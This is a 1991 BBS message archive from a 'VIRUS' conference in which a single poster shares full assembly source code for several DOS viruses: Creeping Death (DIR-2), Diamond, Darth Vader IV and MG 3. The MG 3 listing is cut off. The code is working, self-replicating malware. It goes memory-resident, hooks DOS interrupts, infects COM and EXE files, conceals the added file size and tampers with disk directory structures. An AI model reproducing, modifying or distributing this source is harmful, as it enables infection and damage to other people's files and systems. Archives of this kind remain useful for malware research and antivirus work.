===========================================================================
 BBS: The Programmer's Inn
Date: 11-24-91 (19:52)             Number: 3544
From: AHMED DOGAN                  Refer#: NONE
  To: ALL                           Recvd: NO  
Subj: DIR-2                          Conf: (16) VIRUS     
---------------------------------------------------------------------------
;        Creeping Death  V 1.0
;
;        (C) Copyright 1991 by VirusSoft Corp.

i13org    =    5f8h
i21org    =    5fch

         org   100h

         mov   sp,600h
         inc   counter
         xor   cx,cx
         mov   ds,cx
         lds   ax,[0c1h]
         add   ax,21h
         push  ds
         push  ax
         mov   ah,30h
         call  jump
         cmp   al,4
         sbb   si,si
         mov   drive+2,byte ptr -1
         mov   bx,60h
         mov   ah,4ah
         call  jump

         mov   ah,52h
         call  jump
         push  es:[bx-2]
         lds   bx,es:[bx]

search:  mov   ax,[bx+si+15h]
         cmp   ax,70h
         jne   next
         xchg  ax,cx
         mov   [bx+si+18h],byte ptr -1
         mov   di,[bx+si+13h]
         mov   [bx+si+13h],offset header
         mov   [bx+si+15h],cs
next:    lds   bx,[bx+si+19h]
         cmp   bx,-1
         jne   search
         jcxz  install

         pop   ds
         mov   ax,ds
         add   ax,[3]
         inc   ax
         mov   dx,cs
         dec   dx
         cmp   ax,dx
         jne   no_boot
         add   [3],61h
no_boot: mov   ds,dx
         mov   [1],8

         mov   ds,cx
         les   ax,[di+6]
         mov   cs:str_block,ax
         mov   cs:int_block,es

         cld
         mov   si,1
scan:    dec   si
         lodsw
         cmp   ax,1effh
         jne   scan
         mov   ax,2cah
         cmp   [si+4],ax
         je    right
         cmp   [si+5],ax
         jne   scan
right:   lodsw
         push  cs
         pop   es
         mov   di,offset modify+1
         stosw
         xchg  ax,si
         mov   di,offset i13org
         cli
         movsw
         movsw

         mov   dx,0c000h
fdsk1:   mov   ds,dx
         xor   si,si
         lodsw
         cmp   ax,0aa55h
         jne   fdsk4
         cbw
         lodsb
         mov   cl,9
         sal   ax,cl
fdsk2:   cmp   [si],6c7h
         jne   fdsk3
         cmp   [si+2],4ch
         jne   fdsk3
         push  dx
===========================================================================
 BBS: The Programmer's Inn
Date: 11-24-91 (19:52)             Number: 3545
From: AHMED DOGAN                  Refer#: NONE
  To: ALL                           Recvd: NO  
Subj: DIR-2              <CONT>      Conf: (16) VIRUS     
---------------------------------------------------------------------------
         push  [si+4]
         jmp   short death
install: int   20h
file:    db    "c:",255,0
fdsk3:   inc   si
         cmp   si,ax
         jb    fdsk2
fdsk4:   inc   dx
         cmp   dh,0f0h
         jb    fdsk1

         sub   sp,4
death:   push  cs
         pop   ds
         mov   bx,[2ch]
         mov   es,bx
         mov   ah,49h
         call  jump
         xor   ax,ax
         test  bx,bx
         jz    boot
         mov   di,1
seek:    dec   di
         scasw
         jne   seek
         lea   si,[di+2]
         jmp   short exec
boot:    mov   es,[16h]
         mov   bx,es:[16h]
         dec   bx
         xor   si,si
exec:    push  bx
         mov   bx,offset param
         mov   [bx+4],cs
         mov   [bx+8],cs
         mov   [bx+12],cs
         pop   ds
         push  cs
         pop   es

         mov   di,offset f_name
         push  di
         mov   cx,40
         rep   movsw
         push  cs
         pop   ds

         mov   ah,3dh
         mov   dx,offset file
         call  jump
         pop   dx

         mov   ax,4b00h
         call  jump
         mov   ah,4dh
         call  jump
         mov   ah,4ch

jump:    pushf
         call  dword ptr cs:[i21org]
         ret


;--------Installation complete

i13pr:   mov   ah,3
         jmp   dword ptr cs:[i13org]


main:    push  ax            ; driver
         push  cx            ; strategy block
         push  dx
         push  ds
         push  si
         push  di

         push  es
         pop   ds
         mov   al,[bx+2]

         cmp   al,4          ; Input
         je    input
         cmp   al,8
         je    output
         cmp   al,9
         je    output

         call  in
         cmp   al,2          ; Build BPB
         jne   ppp           ;
         lds   si,[bx+12h]
         mov   di,offset bpb_buf
         mov   es:[bx+12h],di
         mov   es:[bx+14h],cs
         push  es
         push  cs
         pop   es

<ORIGINAL MESSAGE OVER 100 LINES, SPLIT IN 2 OR MORE>
===========================================================================
 BBS: The Programmer's Inn
Date: 11-24-91 (19:52)             Number: 3546
From: AHMED DOGAN                  Refer#: NONE
  To: ALL                           Recvd: NO  
Subj: DIR-2              <CONT>      Conf: (16) VIRUS     
---------------------------------------------------------------------------
         mov   cx,16
         rep   movsw
         pop   es
         push  cs
         pop   ds
         mov   al,[di+2-32]
         cmp   al,2
         adc   al,0
         cbw
         cmp   [di+8-32],0
         je    m32
         sub   [di+8-32],ax
         jmp   short ppp
m32:     sub   [di+15h-32],ax
         sbb   [di+17h-32],0

ppp:     pop   di
         pop   si
         pop   ds
         pop   dx
         pop   cx
         pop   ax
rts:     retf

output:  mov   cx,0ff09h
         call  check
         jz    inf_sec
         call  in
         jmp   short inf_dsk

inf_sec: jmp   _inf_sec
read:    jmp   _read
read_:   add   sp,16
         jmp   short ppp

input:   call  check
         jz    read
inf_dsk: mov   byte ptr [bx+2],4
         cld
         lea   si,[bx+0eh]
         mov   cx,8
save:    lodsw
         push  ax
         loop  save
         mov   [bx+14h],1
         call  driver
         jnz   read_
         mov   byte ptr [bx+2],2
         call  in
         lds   si,[bx+12h]
         mov   ax,[si+6]
         add   ax,15
         mov   cl,4
         shr   ax,cl
         mov   di,[si+0bh]
         add   di,di
         stc
         adc   di,ax
         push  di
         cwd
         mov   ax,[si+8]
         test  ax,ax
         jnz   more
         mov   ax,[si+15h]
         mov   dx,[si+17h]
more:    xor   cx,cx
         sub   ax,di
         sbb   dx,cx
         mov   cl,[si+2]
         div   cx
         cmp   cl,2
         sbb   ax,-1
         push  ax
         call  convert
         mov   byte ptr es:[bx+2],4
         mov   es:[bx+14h],ax
         call  driver
again:   lds   si,es:[bx+0eh]
         add   si,dx
         sub   dh,cl
         adc   dx,ax
         mov   cs:gad+1,dx
         cmp   cl,1
         je    small
         mov   ax,[si]
         and   ax,di
         cmp   ax,0fff7h
         je    bad
         cmp   ax,0ff7h
         je    bad
         cmp   ax,0ff70h
         jne   ok
bad:     pop   ax
         dec   ax
         push  ax
         call  convert
         jmp   short again

<ORIGINAL MESSAGE OVER 100 LINES, SPLIT IN 2 OR MORE>
===========================================================================
 BBS: The Programmer's Inn
Date: 11-24-91 (19:52)             Number: 3547
From: AHMED DOGAN                  Refer#: NONE
  To: ALL                           Recvd: NO  
Subj: DIR-2              <CONT>      Conf: (16) VIRUS     
---------------------------------------------------------------------------
small:   not   di
         and   [si],di
         pop   ax
         push  ax
         inc   ax
         push  ax
         mov   dx,0fh
         test  di,dx
         jz    here
         inc   dx
         mul   dx
here:    or    [si],ax
         pop   ax
         call  convert
         mov   si,es:[bx+0eh]
         add   si,dx
         mov   ax,[si]
         and   ax,di
ok:      mov   dx,di
         dec   dx
         and   dx,di
         not   di
         and   [si],di
         or    [si],dx

         cmp   ax,dx
         pop   ax
         pop   di
         mov   cs:pointer+1,ax
         je    _read_
         mov   dx,[si]
         push  ds
         push  si
         call  write
         pop   si
         pop   ds
         jnz   _read_
         call  driver
         cmp   [si],dx
         jne   _read_
         dec   ax
         dec   ax
         mul   cx
         add   ax,di
         adc   dx,0
         push  es
         pop   ds
         mov   [bx+12h],2
         mov   [bx+14h],ax
         test  dx,dx
         jz    less
         mov   [bx+14h],-1
         mov   [bx+1ah],ax
         mov   [bx+1ch],dx
less:    mov   [bx+10h],cs
         mov   [bx+0eh],100h
         call  write

_read_:  std
         lea   di,[bx+1ch]
         mov   cx,8
load:    pop   ax
         stosw
         loop  load
_read:   call  in

         mov   cx,9
_inf_sec:
         mov   di,es:[bx+12h]
         lds   si,es:[bx+0eh]
         sal   di,cl
         xor   cl,cl
         add   di,si
         xor   dl,dl
         push  ds
         push  si
         call  find
         jcxz  no_inf
         call  write
         and   es:[bx+4],byte ptr 07fh
no_inf:  pop   si
         pop   ds
         inc   dx
         call  find
         jmp   ppp

;--------Subroutines

find:    mov   ax,[si+8]
         cmp   ax,"XE"
         jne   com
         cmp   [si+10],al
         je    found
com:     cmp   ax,"OC"
         jne   go_on
         cmp   byte ptr [si+10],"M"
         jne   go_on

<ORIGINAL MESSAGE OVER 100 LINES, SPLIT IN 2 OR MORE>
===========================================================================
 BBS: The Programmer's Inn
Date: 11-24-91 (19:52)             Number: 3548
From: AHMED DOGAN                  Refer#: NONE
  To: ALL                           Recvd: NO  
Subj: DIR-2              <CONT>      Conf: (16) VIRUS     
---------------------------------------------------------------------------
found:   test  [si+1eh],0ffc0h ; >4MB
         jnz   go_on
         test  [si+1dh],03ff8h ; <2048B
         jz    go_on
         test  [si+0bh],byte ptr 1ch
         jnz   go_on
         test  dl,dl
         jnz   rest
pointer: mov   ax,1234h
         cmp   ax,[si+1ah]
         je    go_on
         xchg  ax,[si+1ah]
gad:     xor   ax,1234h
         mov   [si+14h],ax
         loop  go_on
rest:    xor   ax,ax
         xchg  ax,[si+14h]
         xor   ax,cs:gad+1
         mov   [si+1ah],ax
go_on:  ;rol   cs:gad+1,1
         db    2eh,0d1h,6
         dw    offset gad+1
         add   si,32
         cmp   di,si
         jne   find
         ret

check:   mov   ah,[bx+1]
drive:   cmp   ah,-1
         mov   cs:[drive+2],ah
         jne   changed
         push  [bx+0eh]
         mov   byte ptr [bx+2],1
         call  in
         cmp   byte ptr [bx+0eh],1
         pop   [bx+0eh]
         mov   [bx+2],al
changed: ret

write:   cmp   byte ptr es:[bx+2],8
         jae   in
         mov   byte ptr es:[bx+2],4
         mov   si,70h
         mov   ds,si
modify:  mov   si,1234h
         push  [si]
         push  [si+2]
         mov   [si],offset i13pr
         mov   [si+2],cs
         call  in
         pop   [si+2]
         pop   [si]
         ret

driver:  mov   es:[bx+12h],1
in:
         db    09ah
str_block:
         dw    ?,70h
         db    09ah
int_block:
         dw    ?,70h
         test  es:[bx+4],byte ptr 80h
         ret

convert: cmp   ax,0ff0h
         jae   fat_16
         mov   si,3
         xor   cs:[si+gad-1],si
         mul   si
         shr   ax,1
         mov   di,0fffh
         jnc   cont
         mov   di,0fff0h
         jmp   short cont
fat_16:  mov   si,2
         mul   si
         mov   di,0ffffh
cont:    mov   si,512
         div   si
header:  inc   ax
         ret

counter: dw    0

         dw    842h
         dw    offset main
         dw    offset rts
         db    7fh

param:   dw    0,80h,?,5ch,?,6ch,?

bpb_buf: db    32 dup(?)
f_name:  db    80 dup(?)

;--------The End.


<ORIGINAL MESSAGE OVER 100 LINES, SPLIT IN 2 OR MORE>
===========================================================================
 BBS: The Programmer's Inn
Date: 11-24-91 (19:52)             Number: 3549
From: AHMED DOGAN                  Refer#: NONE
  To: ALL                           Recvd: NO  
Subj: DIR-2              <CONT>      Conf: (16) VIRUS     
---------------------------------------------------------------------------

---
 þ RonMail 1.0 þ Programmer's Inn - Home of FeatherNet (619)-446-4506
===========================================================================
 BBS: The Programmer's Inn
Date: 11-24-91 (20:00)             Number: 3550
From: AHMED DOGAN                  Refer#: NONE
  To: ALL                           Recvd: NO  
Subj: DIAMOND                        Conf: (16) VIRUS     
---------------------------------------------------------------------------
;         The Diamond Virus
;
;           Version  2.10
;
; also known as:
;    V1024, V651, The EGN Virus
;
; Basic release:   5-Aug-1989
; Last patch:           5-May-1990
;
;   COPYRIGHT:
;
; This program is (c) Copyright 1989,1990 Damage, Inc.
; Permission is granted to distribute this source provided the tittle
page is
;   preserved.
; Any fee can be charged for distribution of this source, however,
Damage, Inc.
;   distributes it freely.
; You are specially prohibited to use this program for military
purposes.
; Damage, Inc. is not liable for any kind of damages resulting from
the use of
;   or the inability to use this software.
;
; To assemble this program use Turbo Assembler 1.0

                .radix        16
                .model        tiny
                .code
code_len        =        top_code-main_entry
data_len        =        top_data-top_code
main_entry:
                call        locate_address
gen_count        dw        0
locate_address:
                xchg        ax,bp
                cld
                pop        bx
                inc        word ptr cs:[bx]
                mov        ax,0d5aa
                int        21
                cmp        ax,2a03
                jz        all_done
                mov        ax,sp
                inc        ax
                mov        cl,4
                shr        ax,cl
                inc        ax
                mov        dx,ss
                add        ax,dx
                mov        dx,ds
                dec        dx
                mov        es,dx
                xor        di,di
                mov        cx,(top_data-main_entry-1)/10+1
                mov        dx,[di+2]
                sub        dx,cx
                cmp        dx,ax
                jc        all_done
                cli
                sub        es:[di+3],cx
                mov        [di+2],dx
                mov        es,dx
                lea        si,[bx+main_entry-gen_count]
                mov        cx,top_code-main_entry
                rep
                db        2e
                movsb
                push        ds
                mov        ds,cx
                mov        si,20
                lea        di,[di+old_vector-top_code]
                org        $-1
                mov        ax,offset dos_handler
                xchg        ax,[si+64]
                stosw
                mov        ax,es
                xchg        ax,[si+66]
                stosw
                mov        ax,offset time_handler
                xchg        ax,[si]
                stosw
                xchg        ax,dx
                xchg        ax,[si+2]
                stosw
                mov        ax,24
                stosw
                pop        ds
                push        ds
                pop        es
                sti
all_done:
                lea        si,[bx+exe_header-gen_count]
                db        2e
                lodsw
                cmp        ax,'ZM'
                jz        exit_exe
===========================================================================
 BBS: The Programmer's Inn
Date: 11-24-91 (20:00)             Number: 3551
From: AHMED DOGAN                  Refer#: NONE
  To: ALL                           Recvd: NO  
Subj: DIAMOND            <CONT>      Conf: (16) VIRUS     
---------------------------------------------------------------------------
                mov        di,100
                push        di
                stosw
                movsb
                xchg        ax,bp
                ret
exit_exe:
                mov        dx,ds
                add        dx,10
                add        cs:[si+return_address+2-exe_header-2],dx
                org        $-1
                add        dx,cs:[si+stack_offset+2-exe_header-2]
                org        $-1
                mov        ss,dx
                mov        sp,cs:[si+stack_offset-exe_header-2]
                org        $-1
                xchg        ax,bp
                jmp        dword ptr
cs:[si+return_address-exe_header-2]
                org        $-1
infect:
                mov        dx,offset exe_header
                mov        cx,top_header-exe_header
                mov        ah,3f
                int        21
                jc        do_exit
                sub        cx,ax
                jnz        go_error
                mov        di,offset exe_header
                les        ax,[di+ss_offset-exe_header]
                org        $-1
                mov        [di+stack_offset-exe_header],es
                org        $-1
                mov        [di+stack_offset+2-exe_header],ax
                org        $-1
                les        ax,[di+ip_offset-exe_header]
                org        $-1
                mov        [di+return_address-exe_header],ax
                org        $-1
                mov        [di+return_address+2-exe_header],es
                org        $-1
                mov        dx,cx
                mov        ax,4202
                int        21
                jc        do_exit
                mov        [di+file_size-exe_header],ax
                org        $-1
                mov        [di+file_size+2-exe_header],dx
                org        $-1
                mov        cx,code_len
                cmp        ax,cx
                sbb        dx,0
                jc        do_exit
                xor        dx,dx
                mov        si,'ZM'
                cmp        si,[di]
                jz        do_put_image
                cmp        [di],'MZ'
                jz        do_put_image
                cmp        ax,0fe00-code_len
                jc        put_image
go_error:
                stc
do_exit:
                ret
do_put_image:
                cmp        dx,[di+max_size-exe_header]
                org        $-1
                jz        go_error
                mov        [di],si
put_image:
                mov        ah,40
                int        21
                jc        do_exit
                sub        cx,ax
                jnz        go_error
                mov        dx,cx
                mov        ax,4200
                int        21
                jc        do_exit
                mov        ax,[di+file_size-exe_header]
                org        $-1
                cmp        [di],'ZM'
                jnz        com_file
                mov        dx,[di+file_size-exe_header+2]
                org        $-1
                mov        cx,4
                push        di
                mov        si,[di+header_size-exe_header]
                org        $-1
                xor        di,di
shift_size:
                shl        si,1
                rcl        di,1
                loop        shift_size
                sub        ax,si
                sbb        dx,di

<ORIGINAL MESSAGE OVER 100 LINES, SPLIT IN 2 OR MORE>
===========================================================================
 BBS: The Programmer's Inn
Date: 11-24-91 (20:00)             Number: 3552
From: AHMED DOGAN                  Refer#: NONE
  To: ALL                           Recvd: NO  
Subj: DIAMOND            <CONT>      Conf: (16) VIRUS     
---------------------------------------------------------------------------
                pop        di
                mov        cl,0c
                shl        dx,cl
                mov        [di+ip_offset-exe_header],ax
                org        $-1
                mov        [di+cs_offset-exe_header],dx
                org        $-1
                add        dx,(code_len+data_len+100-1)/10+1
                org        $-1
                mov        [di+sp_offset-exe_header],ax
                org        $-1
                mov        [di+ss_offset-exe_header],dx
                org        $-1
                add        word ptr
[di+min_size-exe_header],(data_len+100-1)/10+1
                org        $-2
                mov        ax,[di+min_size-exe_header]
                org        $-1
                cmp        ax,[di+max_size-exe_header]
                org        $-1
                jc        adjust_size
                mov        [di+max_size-exe_header],ax
                org        $-1
adjust_size:
                mov        ax,[di+last_page-exe_header]
                org        $-1
                add        ax,code_len
                push        ax
                and        ah,1
                mov        [di+last_page-exe_header],ax
                org        $-1
                pop        ax
                mov        cl,9
                shr        ax,cl
                add        [di+page_count-exe_header],ax
                org        $-1
                jmp        short put_header
com_file:
                sub        ax,3
                mov        byte ptr [di],0e9
                mov        [di+1],ax
put_header:
                mov        dx,offset exe_header
                mov        cx,top_header-exe_header
                mov        ah,40
                int        21
                jc        error
                cmp        ax,cx
                jz        reset
error:
                stc
reset:
                ret
find_file:
                pushf
                push        cs
                call        calldos
                test        al,al
                jnz        cant_find
                push        ax
                push        bx
                push        es
                mov        ah,51
                int        21
                mov        es,bx
                cmp        bx,es:[16]
                jnz        not_infected
                mov        bx,dx
                mov        al,[bx]
                push        ax
                mov        ah,2f
                int        21
                pop        ax
                inc        al
                jnz        fcb_standard
                add        bx,7
fcb_standard:
                mov        ax,es:[bx+17]
                and        ax,1f
                xor        al,1e
                jnz        not_infected
                and        byte ptr es:[bx+17],0e0
                sub        es:[bx+1dh],code_len
                sbb        es:[bx+1f],ax
not_infected:
                pop        es
                pop        bx
                pop        ax
cant_find:
                iret
dos_handler:
                cmp        ah,4bh
                jz        exec
                cmp        ah,11
                jz        find_file
                cmp        ah,12
                jz        find_file

<ORIGINAL MESSAGE OVER 100 LINES, SPLIT IN 2 OR MORE>
===========================================================================
 BBS: The Programmer's Inn
Date: 11-24-91 (20:00)             Number: 3553
From: AHMED DOGAN                  Refer#: NONE
  To: ALL                           Recvd: NO  
Subj: DIAMOND            <CONT>      Conf: (16) VIRUS     
---------------------------------------------------------------------------
                cmp        ax,0d5aa
                jnz        calldos
                not        ax
fail:
                mov        al,3
                iret
exec:
                cmp        al,2
                jnc        calldos
                push        ds
                push        es
                push        ax
                push        bx
                push        cx
                push        dx
                push        si
                push        di
                mov        ax,3524
                int        21
                push        es
                push        bx
                mov        ah,25
                push        ax
                push        ds
                push        dx
                push        cs
                pop        ds
                mov        dx,offset fail
                int        21
                pop        dx
                pop        ds
                mov        ax,4300
                int        21
                jc        exit
                test        cl,1
                jz        open
                dec        cx
                mov        ax,4301
                int        21
open:
                mov        ax,3d02
                int        21
                jc        exit
                xchg        ax,bx
                mov        ax,5700
                int        21
                jc        close
                mov        al,cl
                or        cl,1f
                dec        cx
                xor        al,cl
                jz        close
                push        cs
                pop        ds
                push        cx
                push        dx
                call        infect
                pop        dx
                pop        cx
                jc        close
                mov        ax,5701
                int        21
close:
                mov        ah,3e
                int        21
exit:
                pop        ax
                pop        dx
                pop        ds
                int        21
                pop        di
                pop        si
                pop        dx
                pop        cx
                pop        bx
                pop        ax
                pop        es
                pop        ds
calldos:
                jmp        cs:[old_vector]
                .radix        10
adrtbl                dw
1680,1838,1840,1842,1996,1998,2000,2002,2004,2154,2156
                dw
2158,2160,2162,2164,2166,2316,2318,2320,2322,2324,2478
                dw        2480,2482,2640
diftbl                dw
-324,-322,-156,158,-318,-316,318,156,162,316,164,-322
                dw
-162,-322,322,322,-324,-158,164,316,-324,324,-316,-164
                dw        324
valtbl                dw
3332,3076,3076,3076,3588,3588,3588,3588,3588,3844,3844
                dw
3844,3844,3844,3844,3844,2564,2564,2564,2564,2564,2820
                dw        2820,2820,2308
xlatbl                dw

<ORIGINAL MESSAGE OVER 100 LINES, SPLIT IN 2 OR MORE>
===========================================================================
 BBS: The Programmer's Inn
Date: 11-24-91 (20:00)             Number: 3554
From: AHMED DOGAN                  Refer#: NONE
  To: ALL                           Recvd: NO  
Subj: DIAMOND            <CONT>      Conf: (16) VIRUS     
---------------------------------------------------------------------------
-324,316,-164,156,-322,318,-162,158,-318,322,-158,162
                dw        -316,324,-156,164
                .radix        16
time_handler:
                push        ds
                push        es
                push        ax
                push        bx
                push        cx
                push        dx
                push        si
                push        di
                push        cs
                pop        ds
                cld
                mov        dx,3da
                mov        cx,19
                mov        si,offset count
                mov        ax,[si]
                test        ah,ah
                jnz        make_move
                mov        al,ah
                mov        es,ax
                cmp        al,es:[46dh]
                jnz        exit_timer
                mov        ah,0f
                int        10
                cmp        al,2
                jz        init_diamond
                cmp        al,3
                jnz        exit_timer
init_diamond:
                inc        byte ptr [si+1]
                sub        bl,bl
                add        bh,0b8
                mov        [si+2],bx
                mov        es,bx
wait_snow:
                in        al,dx
                test        al,8
                jz        wait_snow
                mov        si,offset valtbl
build_diamond:
                mov        di,[si+adrtbl-valtbl]
                movsw
                loop        build_diamond
exit_timer:
                pop        di
                pop        si
                pop        dx
                pop        cx
                pop        bx
                pop        ax
                pop        es
                pop        ds
                jmp        cs:[old_timer]
count_down:
                dec        byte ptr [si]
                jmp        exit_timer
make_move:
                test        al,al
                jnz        count_down
                inc        byte ptr [si]
                mov        si,offset adrtbl
make_step:
                push        cx
                push        cs
                pop        es
                lodsw
                mov        bx,ax
                sub        ax,140
                cmp        ax,0d20
                jc        no_xlat
                test        ax,ax
                mov        ax,[si+diftbl-adrtbl-2]
                jns        test_xlat
                test        ax,ax
                js        do_xlat
                jmp        short no_xlat
test_xlat:
                test        ax,ax
                js        no_xlat
do_xlat:
                mov        di,offset xlatbl
                mov        cx,10
                repnz        scasw
                dec        di
                dec        di
                xor        di,2
                mov        ax,[di]
                mov        [si+diftbl-adrtbl-2],ax
no_xlat:
                mov        ax,[si-2]
                add        ax,[si+diftbl-adrtbl-2]
                mov        [si-2],ax
                mov        cx,19
                mov        di,offset adrtbl

<ORIGINAL MESSAGE OVER 100 LINES, SPLIT IN 2 OR MORE>
===========================================================================
 BBS: The Programmer's Inn
Date: 11-24-91 (20:00)             Number: 3555
From: AHMED DOGAN                  Refer#: NONE
  To: ALL                           Recvd: NO  
Subj: DIAMOND            <CONT>      Conf: (16) VIRUS     
---------------------------------------------------------------------------
lookup:
                jcxz        looked_up
                repnz        scasw
                jnz        looked_up
                cmp        si,di
                jz        lookup
                mov        [si-2],bx
                mov        ax,[si+diftbl-adrtbl-2]
                xchg        ax,[di+diftbl-adrtbl-2]
                mov        [si+diftbl-adrtbl-2],ax
                jmp        lookup
looked_up:
                mov        es,[homeadr]
                mov        di,bx
                xor        bx,bx
                call        out_char
                mov        di,[si-2]
                mov        bx,[si+valtbl-adrtbl-2]
                call        out_char
                pop        cx
                loop        make_step
                jmp        exit_timer
out_char:
                in        al,dx
                test        al,1
                jnz        out_char
check_snow:
                in        al,dx
                test        al,1
                jz        check_snow
                xchg        ax,bx
                stosw
                ret
stack_offset        dd        ?
return_address        dd        ?
                db        '7106286813'
exe_header:        int        20
last_page:        nop
top_code:
                db        ?
page_count        dw        ?
                dw        ?
header_size        dw        ?
min_size        dw        ?
max_size        dw        ?
ss_offset        dw        ?
sp_offset        dw        ?
                dw        ?
ip_offset        dw        ?
cs_offset        dw        ?
top_header:
file_size        dd        ?
old_vector        dd        ?
old_timer        dd        ?
count                db        ?
flag                db        ?
homeadr         dw        ?
top_data:
                end

---
 þ RonMail 1.0 þ Programmer's Inn - Home of FeatherNet (619)-446-4506
===========================================================================
 BBS: The Programmer's Inn
Date: 11-24-91 (20:06)             Number: 3556
From: AHMED DOGAN                  Refer#: NONE
  To: ALL                           Recvd: NO  
Subj: DARTH VADER                    Conf: (16) VIRUS     
---------------------------------------------------------------------------
;*********************************************************************
**********
;*
*
;*                              D A R T H   V A D E R   IV
*
;*
*
;*        (C) - Copyright 1991 by Waleri Todorov, CICTT-Sofia
*
;*        All Rights Reserved
*
;*
&
;*        Enchanced by: Lazy Wizard
&
;*
&
;*        Turbo Assembler 2.0
&
;*
&
;*********************************************************************
**********


                .model        tiny
                .code

                org        100h

Start:
                call        NextLine
First3:
                int        20h
                int        3
NextLine:
                pop        bx
                push        ax
                xor        di,di
                mov        es,di
                mov        es,es:[2Bh*4+2]
                mov        cx,1000h
                call        SearchZero
                jc        ReturnControl
                xchg        ax,si
                inc        si
SearchTable:
                dec        si
                db        26h
                lodsw
                cmp        ax,8B2Eh
                jne        SearchTable
                db        26h
                lodsb
                cmp        al,75h
                je        ReturnControl
                cmp        al,9Fh
                jne        SearchTable
                mov        si,es:[si]
                mov        cx,LastByte-Start
                lea        ax,[di+Handle-Start]
                org        $-1
                xchg        ax,es:[si+80h]
                sub        ax,di
                sub        ax,cx
                mov        [bx+OldWrite-Start-2],ax
                mov        word ptr [bx+NewStart+1-Start-3],di
                lea        si,[bx-3]
                rep        movsb
ReturnControl:
                pop        ax
                push        ss
                pop        es
                mov        di,100h
                lea        si,[bx+First3-Start-3]
                push        di
                movsw
                movsb
                ret
SearchZero:
                xor        ax,ax
                inc        di
                push        cx
                push        di
                mov        cx,(LastByte-Start-1)/2+1
                repe        scasw
                pop        di
                pop        cx
                je        FoundPlace
                loop        SearchZero
                stc
FoundPlace:
                ret
Handle:
                push        bp
                call        NextHandle
NextHandle:
===========================================================================
 BBS: The Programmer's Inn
Date: 11-24-91 (20:06)             Number: 3557
From: AHMED DOGAN                  Refer#: NONE
  To: ALL                           Recvd: NO  
Subj: DARTH VADER        <CONT>      Conf: (16) VIRUS     
---------------------------------------------------------------------------
                pop        bp
                push        es
                push        ax
                push        bx
                push        cx
                push        si
                push        di
                test        ch,ch
                je        Do
                mov        ax,1220h
                int        2Fh
                mov        bl,es:[di]
                mov        ax,1216h
                int        2Fh
                cmp        es:[di+29h],'MO'
                jne        Do
                cmp        word ptr es:[di+15h],0
                jne        Do
                push        ds
                pop        es
                mov        di,dx
                mov        ax,[di]
                mov        [bp+First3-NextHandle],ax
                mov        al,[di+2]
                mov        [bp+First3+2-NextHandle],al
                call        SearchZero
                jc        Do
                push        di
NewStart:
                mov        si,0
                mov        cx,(LastByte-Start-1)/2
                cli
                rep
                db        36h
                movsw
                sti
                mov        di,dx
                mov        al,0E9h
                stosb
                pop        ax
                sub        ax,di
                dec        ax
                dec        ax
                stosw
Do:
                pop        di
                pop        si
                pop        cx
                pop        bx
                pop        ax
                pop        es
                pop        bp
OldWrite:
                jmp        start

LastByte        label        byte

                end        Start

---
 þ RonMail 1.0 þ Programmer's Inn - Home of FeatherNet (619)-446-4506
===========================================================================
 BBS: The Programmer's Inn
Date: 11-24-91 (20:07)             Number: 3558
From: AHMED DOGAN                  Refer#: NONE
  To: ALL                           Recvd: NO  
Subj: MG 3                           Conf: (16) VIRUS     
---------------------------------------------------------------------------
;        (C) Copyright VirusSoft Corp.  Sep., 1990
;
;   This is the SOURCE file of last version of MASTER,(V500),(MG) ect.
;   virus, distributed by VirusSoft company . First version was made
;   in   May., 1990 . Please don't make any corections in this file !
;
;                        Bulgaria, Varna
;                        Sep. 27, 1990



         ofs = 201h
         len = offset end-ofs

         call  $+6

         org   ofs

first:   dw    020cdh
         db    0

         pop   di
         dec   di
         dec   di
         mov   si,[di]
         dec   di
         add   si,di
         push  cs
         push  di
         cld
         movsw
         movsb
         xchg  ax,dx

         mov   ax,4b04h
         int   21h
         jnc   residnt

         xor   ax,ax
         mov   es,ax
         mov   di,ofs+3
         mov   cx,len-3
         rep   movsb

         les   di,[6]
         mov   al,0eah
         dec   cx
         repne scasb
         les   di,es:[di]         ; Searching for the INT21 vector
         sub   di,-1ah-7

         db    0eah
         dw    offset jump,0      ; jmp far 0000:jump

jump:    push  es
         pop   ds
         mov   si,[di+3-7]        ;
         lodsb                    ;
         cmp   al,68h             ; compare DOS Ver
         mov   [di+4-7],al        ; Change CMP AH,CS:[????]
         mov   [di+2-7],0fc80h    ;
         mov   [di-7],0fccdh      ;

         push  cs
         pop   ds

         mov   [1020],di          ; int  0ffh
         mov   [1022],es

         mov   beg-1,byte ptr not3_3-beg
         jb    not3.3             ; CY = 0  -->  DOS Ver > or = 3.30
         mov   beg-1,byte ptr 0
         mov   [7b4h],offset pr7b4
         mov   [7b6h],cs          ; 7b4

not3.3:  mov   al,0a9h            ; Change attrib
cont:    repne scasb
         cmp   es:[di],0ffd8h
         jne   cont
         mov   al,18h
         stosb

         push  ss
         pop   ds

         push  ss
         pop   es

residnt: xchg  ax,dx
         retf                     ; ret   far

;--------Interrupt process--------;

i21pr:   push  ax
         push  dx
         push  ds
         push  cx
         push  bx
===========================================================================
 BBS: The Programmer's Inn
Date: 11-24-91 (20:07)             Number: 3559
From: AHMED DOGAN                  Refer#: NONE
  To: ALL                           Recvd: NO  
Subj: MG 3               <CONT>      Conf: (16) VIRUS     
---------------------------------------------------------------------------
         push  es

if4b04:  cmp   ax,4b04h
         je    rti

         xchg  ax,cx
         mov   ah,02fh
         int   0ffh

if11_12: cmp   ch,11h
         je    yes
         cmp   ch,12h
         jne   inffn
yes:     xchg  ax,cx
         int   0ffh
         push  ax
         test  es:byte ptr [bx+19],0c0h
         jz    normal
         sub   es:[bx+36],len
normal:  pop   ax
rti:     pop   es
         pop   bx
         pop   cx
         add   sp,12
         iret

inffn:   mov   ah,19h
         int   0ffh
         push  ax

if36:    cmp   ch,36h             ; -free bytes
         je    beg_36
if4e:    cmp   ch,4eh             ; -find first FM
         je    beg_4b
if4b:    cmp   ch,4bh             ; -exec
         je    beg_4b
if47:    cmp   ch,47h             ; -directory info
         jne   if5b
         cmp   al,2
         jae   begin              ; it's hard-disk
if5b:    cmp   ch,5bh             ; -create new
         je    beg_4b
if3c_3d: shr   ch,1               ; > -open & create
         cmp   ch,1eh             ;   -
         je    beg_4b

         jmp   rest

beg_4b:  mov   ax,121ah
         xchg  dx,si
         int   2fh
         xchg  ax,dx
         xchg  ax,si

beg_36:  mov   ah,0eh             ; change current drive
         dec   dx                 ;
         int   0ffh               ;

begin:
         push  es                 ; save DTA address
         push  bx                 ;
         sub   sp,44
         mov   dx,sp              ; change DTA
         push  sp
         mov   ah,1ah
         push  ss
         pop   ds
         int   0ffh
         mov   bx,dx

         push  cs
         pop   ds

